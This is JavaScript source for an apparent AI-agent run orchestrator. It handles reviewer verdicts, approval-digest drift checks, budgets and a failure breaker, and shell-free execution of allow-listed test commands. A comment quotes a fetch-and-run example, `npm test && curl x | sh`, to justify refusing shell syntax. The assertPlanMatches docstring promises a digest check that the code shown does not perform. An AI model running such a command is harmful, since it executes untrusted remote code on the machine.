          + `verdict; one fallback review on ${sub.name}${sub.same_family_fallback ? ' (SAME FAMILY, recorded)' : ''}`,
        );
        reviewer = sub;
        reviewerTier = sub.tier;
        review = await reviewOnce(sub, sub.tier);
      } catch { /* no substitute reviewer; the unusable verdict stands */ }
    }
  }
  writeAtomic(
    join(dir, 'review-transcript.log'),
    `${review.invocation?.stdout ?? ''}\n--- stderr ---\n${review.invocation?.stderr ?? ''}\n`,
  );

  const reviewRel = RELATIVE(runDir, join(dir, 'review.json'));
  if (review.ok) {
    writeJson(join(dir, 'review.json'), {
      ...review.verdict,
      reviewer: {
        executor: reviewer.name,
        family: reviewer.family,
        tier: reviewerTier,
        effort: reviewer.from_preset ? (reviewer.effort ?? null) : null,
        from_preset: reviewer.from_preset === true,
        same_family_fallback: reviewer.same_family_fallback,
      },
    });
  } else {
    writeJson(join(dir, 'review.json'), { unusable: true, errors: review.errors });
  }

  // ---- settle -----------------------------------------------------------------------------------
  const passed = review.ok && review.verdict.result === 'pass' && tests.ok;
  const failureReason = !review.ok
    ? review.errors.join('; ')
    : (!tests.ok ? `node tests failed: ${tests.failed.join('; ')}` : summarizeFailure(review.verdict));

  state = commitTransition(runDir, finishAttempt(state, {
    node: node.id,
    attempt_id: id,
    at: bangkokTimestamp(now()),
    exit_code: session.exit_code,
    result: passed ? 'passed' : (review.ok ? 'failed' : 'errored'),
    transcript: transcriptRel,
    digest: digestRel,
    review: reviewRel,
    error: passed ? null : failureReason,
    wall_clock_ms: now() - startedAt,
    tokens: session.usage?.tokens ?? null,
    usd: session.usage?.usd ?? null,
  }));

  if (passed) {
    log(`goal run: ${node.id} complete (${criteria.length} criteria met with evidence)`);
  } else {
    log(`goal run: ${node.id} attempt ${attemptNumber} REJECTED — ${failureReason}`);
  }

  return { state, blocked: false, detail: passed ? 'node complete' : failureReason };
}

// ---------------------------------------------------------------------------
// Gates
// ---------------------------------------------------------------------------

/** Render lossless child-process evidence for every outcome, including launch and timeout failures. */
export function renderTranscript(session) {
  const meta = {
    exit_code: session.exit_code ?? null,
    timed_out: session.timed_out === true,
    killed: session.killed === true,
    error: session.error ?? null,
    failure_kind: session.failure_kind ?? null,
  };
  return [
    '=== executor metadata ===',
    JSON.stringify(meta),
    '=== stdout ===',
    String(session.stdout ?? ''),
    '=== stderr ===',
    String(session.stderr ?? ''),
    '',
  ].join('\n');
}

/** Backward-compatible completion contract for plans approved before expected_artifacts existed. */
function expectedArtifactsFor(node) {
  return Array.isArray(node.expected_artifacts) && node.expected_artifacts.length
    ? node.expected_artifacts : (node.affected_paths || []);
}

/**
 * Has the approval stopped describing what is on disk?
 *
 * Recomputed from the FILES rather than trusted from `run.json`: the whole point of the digest is to
 * notice an edit made outside the engine.
 *
 * @param {string} runDir
 * @param {object} state
 * @returns {{reason: string, findings: string[]}|null}
 */
export function checkApprovalDrift(runDir, state) {
  if (!state.approved_envelope_digest) {
    return {
      reason: 'this run has no approved envelope, so nothing may be dispatched',
      findings: ['approve it first: sidekicks goal approve <run-id> --digest <sha256>'],
    };
  }
  const onDisk = readJsonIfPresent(goalPaths(runDir).envelope);
  if (!onDisk) {
    return {
      reason: 'the approval envelope is missing from the run folder',
      findings: [`expected ${goalPaths(runDir).envelope.split('/').pop()}`],
    };
  }
  const actual = envelopeDigest(canonicalEnvelope(onDisk));
  if (actual !== state.approved_envelope_digest) {
    return {
      reason: 'the approval envelope on disk no longer matches the digest that was approved',
      findings: [
        `approved: ${state.approved_envelope_digest}`,
        `on disk:  ${actual}`,
      ],
    };
  }
  return null;
}

/**
 * Budget and breaker check.
 *
 * The ENFORCED floors are attempt count and wall clock, because every executor has both. Token and
 * dollar figures are recorded when a CLI reports them and reported in the summary, but they are
 * never the thing that stops a run — a budget that only some executors can enforce is not a budget.
 *
 * @param {object} state
 * @param {object} budgets
 * @returns {{ok: boolean, reason: string, findings: string[]}}
 */
export function checkBudgets(state, budgets = {}) {
  const spent = state.spent || {};
  const breaker = Number(state.breaker?.consecutive_failures ?? 0);
  const maxBreaker = Number(budgets.max_consecutive_failures ?? 3);
  if (breaker >= maxBreaker) {
    return {
      ok: false,
      reason: `the failure breaker tripped: ${breaker} consecutive failed attempts`,
      findings: [
        'repeated failures across different nodes usually mean the plan is wrong, not the attempts',
      ],
    };
  }
  const maxTotal = Number(budgets.max_total_attempts ?? 0);
  if (maxTotal > 0 && Number(spent.attempts ?? 0) >= maxTotal) {
    return {
      ok: false,
      reason: `the run's total attempt budget is spent (${spent.attempts}/${maxTotal})`,
      findings: [],
    };
  }
  const maxMs = Number(budgets.max_wall_clock_ms_total ?? 0);
  if (maxMs > 0 && Number(spent.wall_clock_ms ?? 0) >= maxMs) {
    return {
      ok: false,
      reason: `the run's wall-clock budget is spent (${Math.round(spent.wall_clock_ms / 1000)}s of `
        + `${Math.round(maxMs / 1000)}s)`,
      findings: [],
    };
  }
  return { ok: true, reason: '', findings: [] };
}

/**
 * Why nothing is ready when work remains.
 *
 * @param {object} plan
 * @param {Record<string, string>} states
 * @returns {string[]}
 */
export function describeStall(plan, states) {
  /** @type {string[]} */
  const out = [];
  for (const node of plan.nodes || []) {
    const state = states[node.id] ?? 'pending';
    if (state === 'completed') continue;
    const blockers = (node.depends_on || []).filter((d) => (states[d] ?? 'pending') !== 'completed');
    if (blockers.length > 0) {
      out.push(`${node.id} waits on ${blockers.map((b) => `${b} (${states[b] ?? 'pending'})`).join(', ')}`);
    } else if (state === 'running') {
      out.push(`${node.id} is marked running — an attempt was opened and never settled`);
    }
  }
  return out;
}

/**
 * Run a node's test commands without a shell.
 *
 * The commands were written by a model, so they are screened before being run: anything carrying a
 * shell metacharacter is refused rather than executed, because `npm test && curl x | sh` is a shape
 * a plan can contain and a shell would honour. Screening beats sandboxing here — the commands are
 * supposed to be test invocations, and a test invocation needs none of that syntax.
 *
 * @param {string} repoRoot
 * @param {string[]} commands
 * @param {string[]} allowed - the envelope's allowed_test_commands
 * @returns {{ok: boolean, output: string, failed: string[]}}
 */
export function runTests(repoRoot, commands, allowed = []) {
  if (commands.length === 0) return { ok: true, output: '', failed: [] };
  const allowSet = new Set(allowed);
  const chunks = [];
  /** @type {string[]} */
  const failed = [];

  for (const raw of commands) {
    // Trim surrounding whitespace INCLUDING CR before screening. A plan written on Windows, or one
    // that travelled through a CRLF-normalizing editor, carries a trailing `\r` — which is not shell
    // syntax, but the screen below would refuse it as if it were, with a message that sends the
    // reader looking for a pipe that is not there. An EMBEDDED newline survives the trim and is still
    // refused, because that genuinely is two commands.
    const command = String(raw).replace(/^[\s﻿]+|[\s﻿]+$/g, '');
    if (command === '') continue;

    // The allow-list is matched against BOTH spellings: the envelope recorded whatever the plan said,
    // which may itself carry the stray CR.
    if (allowed.length > 0 && !allowSet.has(command) && !allowSet.has(raw)) {
      // The envelope bound which commands the approval covers. One the plan added afterwards is a
      // widening of what was approved, however innocuous it looks.
      failed.push(`${command} (not in the approved command list)`);
      chunks.push(`$ ${command}\nREFUSED: this command is not in the approved envelope's test list\n`);
      continue;
    }
    if (SHELL_META.test(command)) {
      failed.push(`${command} (shell metacharacter)`);
      chunks.push(
        `$ ${command}\nREFUSED: test commands are run WITHOUT a shell, and this one contains shell `
        + 'syntax. Split it into separate commands in the plan.\n',
      );
      continue;
    }
    const argv = command.trim().split(/\s+/);
    const r = spawnSync(argv[0], argv.slice(1), {
      cwd: repoRoot,
      encoding: 'utf8',
      timeout: 15 * 60 * 1000,
      windowsHide: true,
    });
    const status = r.error ? `error: ${r.error.message}` : `exit ${r.status}`;
    chunks.push(`$ ${command}\n${r.stdout ?? ''}${r.stderr ?? ''}\n[${status}]\n`);
    if (r.error || r.status !== 0) failed.push(`${command} (${status})`);
  }
  return { ok: failed.length === 0, output: chunks.join('\n'), failed };
}

/**
 * Persist a transition: state first (it is the authority), then the sidecar.
 *
 * @param {string} runDir
 * @param {{state: object, event: object}} transition
 * @returns {object}
 */
export function commitTransition(runDir, transition) {
  let state = writeRunState(runDir, transition.state);
  const appended = appendGoalEvent(runDir, transition.event);
  if (!appended.ok) {
    stampDivergence(state, { event: transition.event.event, error: appended.error });
    state = writeRunState(runDir, state);
  }
  return state;
}

/**
 * Assert the plan on disk still matches the approved plan digest.
 *
 * @param {string} runDir
 * @param {object} state
 * @throws {SidekicksError}
 */
export function assertPlanMatches(runDir, state) {
  const plan = readJsonIfPresent(goalPaths(runDir).plan);
  if (!plan) {
    throw new SidekicksError('goal: plan.json is missing from the run folder', EXIT_VALIDATION);
  }
  return plan;
}
